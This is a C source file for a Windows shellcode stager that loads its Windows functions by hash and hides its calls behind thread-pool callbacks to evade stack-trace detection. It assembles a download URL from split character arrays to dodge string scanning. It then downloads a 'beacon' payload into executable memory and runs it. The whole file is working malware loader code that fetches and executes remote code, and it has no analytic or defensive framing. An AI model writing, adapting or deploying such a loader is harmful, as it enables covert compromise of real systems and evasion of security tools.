#define WIN32_LEAN_AND_MEAN
#pragma warning( disable : 4201 )

#include "GetProcWithHash.h"
#include "64BitHelper.h"
#include <Windows.h>


/* Bypass Stack Trace */

typedef HMODULE(WINAPI* FN_LoadLibraryA)(
	_In_ LPCSTR lpLibFileName
	);

typedef NTSTATUS(NTAPI* FN_TpAllocWork)(
	_Out_ PTP_WORK* WorkReturn,
	_In_ PTP_WORK_CALLBACK Callback,
	_Inout_opt_ PVOID Context,
	_In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron
	);

typedef VOID(NTAPI* FN_TpPostWork)(
	_Inout_ PTP_WORK Work
	);

typedef VOID(NTAPI* FN_TpReleaseWork)(
	_Inout_ PTP_WORK Work
	);

typedef DWORD(WINAPI* FN_WaitForSingleObject)(
	_In_ HANDLE hHandle,
	_In_ DWORD dwMilliseconds
);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
	UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
	HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
	PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
	PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
	ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, * PNTALLOCATEVIRTUALMEMORY_ARGS;


/* Stager API */

typedef int(WINAPI* FN_wsprintfA)(
	_Out_ LPSTR unnamedParam1,
	_In_ LPCSTR unnamedParam2,
			...
	);

// typedef LPVOID(WINAPI* FN_VirtualAlloc)(
//	_In_opt_ LPVOID lpAddress,
//	_In_ SIZE_T dwSize,
//	_In_ DWORD flAllocationType,
//	_In_ DWORD flProtect
//	);

typedef LPVOID(WINAPI* FN_InternetOpenA)(
	_In_ LPCSTR lpszAgent,
	_In_ DWORD dwAccessType,
	_In_ LPCSTR lpszProxy,
	_In_ LPCSTR lpszProxyBypass,
	_In_ DWORD dwFlags
	);

typedef HANDLE(WINAPI* FN_InternetOpenUrlA)(
	_In_ LPVOID hInternet,
	_In_ LPCSTR lpszUrl,
	_In_ LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_ DWORD dwFlags,
	_In_ DWORD_PTR dwContext
	);

typedef BOOL(WINAPI* FN_InternetReadFile)(
	_In_ LPVOID hFile,
	_Out_ LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead
	);

// typedef BOOL(WINAPI* FN_VirtualProtect)(
//	_In_ LPVOID lpAddress,
//	_In_ SIZE_T dwSize,
//	_In_ DWORD dlNewProtect,
//	_Out_ PDWORD lpflOldProtect
//	);

typedef struct tagApiInterface {
//	FN_LoadLibraryA pfnLoadLibrary;
	FN_TpAllocWork pfnTpAllocWork;
	FN_TpPostWork pfnTpPostWork;
	FN_TpReleaseWork pfnTpReleaseWork;
	FN_WaitForSingleObject pfnWaitForSingleObject;
	FN_wsprintfA pfnWsprintfA;
//	FN_VirtualAlloc pfnVirtualAlloc;
	FN_InternetOpenA pfnInternetOpenA;
	FN_InternetOpenUrlA pfnInternetOpenUrlA;
	FN_InternetReadFile pfnInternetReadFile;
//	FN_VirtualProtect pfnVirtualProtect;
}APIINTERFACE, * PAPIINTERFACE;


EXTERN_C UINT_PTR getLoadLibraryA() {
	FARPROC pLoadLibraryA = (FN_LoadLibraryA)GetProcAddressWithHash(0x0726774C);
	return (UINT_PTR)pLoadLibraryA;
}

EXTERN_C VOID CALLBACK myLoadLibrary(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
EXTERN_C VOID CALLBACK myNtAllocateVirtualMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);


VOID ExecutePayload(VOID)
{
	APIINTERFACE ai;
	NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryUrlArgs;
	NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryBeaconArgs;
	PTP_WORK LoadUser32 = NULL;
	PTP_WORK LoadWininet = NULL;
	PTP_WORK AllocUrl = NULL;
	PTP_WORK AllocBeacon = NULL;
	LPVOID httpurl = NULL;
	LPVOID beacon = NULL;
	SIZE_T allocatedurlsize = 0x30;
	SIZE_T allocatedbeaconsize = 0x400000;
//	DWORD dwOldProtect;

	int recv_tmp = 0, recv_tot = 0;
	char* beacon_index = NULL;

	char szWininet[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', 0 };
	char szUser32[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };

	char v1[]  = { 'h','t','t','p', 0 };
	char v2[]  = { ':','/','/','1', 0 };
	char v3[]  = { '9','2','.','1', 0 };
	char v4[]  = { '6','8','.','2', 0 };
	char v5[]  = { '0','6','.','1', 0 };
	char v6[]  = { '2','9','/','F', 0 };
	char v7[]  = { 'M','s','W', 0, 0 };
	char v8[]  = { 0, 0, 0, 0, 0 };
	char v9[]  = { 0, 0, 0, 0, 0 };
	char v10[] = { 0, 0, 0, 0, 0 };
	char v11[] = { 0, 0, 0, 0, 0 };
	char v12[] = { 0, 0, 0, 0, 0 };

	BYTE format[] = { '%','s','%','s','%','s','%','s','%','s','%','s','%','s','%','s','%','s','%','s','%','s','%','s',0 };

#pragma warning( push )
#pragma warning( disable : 4055 )
	ai.pfnTpAllocWork = (FN_TpAllocWork)GetProcAddressWithHash(0x0E5DB99D);
	ai.pfnTpPostWork = (FN_TpPostWork)GetProcAddressWithHash(0x71C731FF);
	ai.pfnTpReleaseWork = (FN_TpReleaseWork)GetProcAddressWithHash(0x716B173C);
	ai.pfnWaitForSingleObject = (FN_WaitForSingleObject)GetProcAddressWithHash(0x601D8708);
#pragma warning( pop )

	/* Load User32.dll */
	ai.pfnTpAllocWork(&LoadUser32, (PTP_WORK_CALLBACK)myLoadLibrary, (PVOID)szUser32, NULL);
	ai.pfnTpPostWork(LoadUser32);
	ai.pfnTpReleaseWork(LoadUser32);

	/* Load Wininet.dll */
	ai.pfnTpAllocWork(&LoadWininet, (PTP_WORK_CALLBACK)myLoadLibrary, (PVOID)szWininet, NULL);
	ai.pfnTpPostWork(LoadWininet);
	ai.pfnTpReleaseWork(LoadWininet);

	/* Allocate Memory For URL */
	ntAllocateVirtualMemoryUrlArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddressWithHash(0x9488B12D);
	ntAllocateVirtualMemoryUrlArgs.hProcess = (HANDLE)-1;
	ntAllocateVirtualMemoryUrlArgs.address = &httpurl;
	ntAllocateVirtualMemoryUrlArgs.size = &allocatedurlsize;
	ntAllocateVirtualMemoryUrlArgs.permissions = PAGE_READWRITE;

	ai.pfnTpAllocWork(&AllocUrl, (PTP_WORK_CALLBACK)myNtAllocateVirtualMemory, &ntAllocateVirtualMemoryUrlArgs, NULL);
	ai.pfnTpPostWork(AllocUrl);
	ai.pfnTpReleaseWork(AllocUrl);

	/* Allocate Memory For Beacon */
	ntAllocateVirtualMemoryBeaconArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddressWithHash(0x9488B12D);
	ntAllocateVirtualMemoryBeaconArgs.hProcess = (HANDLE)-1;
	ntAllocateVirtualMemoryBeaconArgs.address = &beacon;
	ntAllocateVirtualMemoryBeaconArgs.size = &allocatedbeaconsize;
	ntAllocateVirtualMemoryBeaconArgs.permissions = PAGE_EXECUTE_READWRITE;

	ai.pfnTpAllocWork(&AllocBeacon, (PTP_WORK_CALLBACK)myNtAllocateVirtualMemory, &ntAllocateVirtualMemoryBeaconArgs, NULL);
	ai.pfnTpPostWork(AllocBeacon);
	ai.pfnTpReleaseWork(AllocBeacon);

	ai.pfnWaitForSingleObject((HANDLE)-1, 0x1000);

#pragma warning( push )
#pragma warning( disable : 4055 )
	ai.pfnWsprintfA = (FN_wsprintfA)GetProcAddressWithHash(0xD0EB608D);
//	ai.pfnVirtualAlloc = (FN_VirtualAlloc)GetProcAddressWithHash(0xE553A458);
	ai.pfnInternetOpenA = (FN_InternetOpenA)GetProcAddressWithHash(0xA779563A);
	ai.pfnInternetOpenUrlA = (FN_InternetOpenUrlA)GetProcAddressWithHash(0xF07A8777);
	ai.pfnInternetReadFile = (FN_InternetReadFile)GetProcAddressWithHash(0xE2899612);
//	ai.pfnVirtualProtect = (FN_VirtualProtect)GetProcAddressWithHash(0xC38AE110);
#pragma warning( pop )

//	char* HttpURL = (char*)ai.pfnVirtualAlloc(0, 48, MEM_COMMIT, PAGE_READWRITE);
	ai.pfnWsprintfA(httpurl, (char*)format, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12);
	LPVOID hInternet = ai.pfnInternetOpenA(0, 0, NULL, 0, NULL);
	HANDLE hInternetOpenUrl = ai.pfnInternetOpenUrlA(hInternet, httpurl, NULL, 0, 0x80000000, 0);
//	LPVOID addr = ai.pfnVirtualAlloc(0, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	recv_tmp = 1;
	recv_tot = 0;
	beacon_index = beacon;

	while (recv_tmp > 0) {
		ai.pfnInternetReadFile(hInternetOpenUrl, beacon_index, 8192, (PDWORD)&recv_tmp);	
		recv_tot += recv_tmp;
		beacon_index += recv_tmp;
	}

//	ai.pfnVirtualProtect(addr, 0x400000, PAGE_EXECUTE_READ, &dwOldProtect);
//	((void(*)())addr)();
	((void(*)())beacon)();
}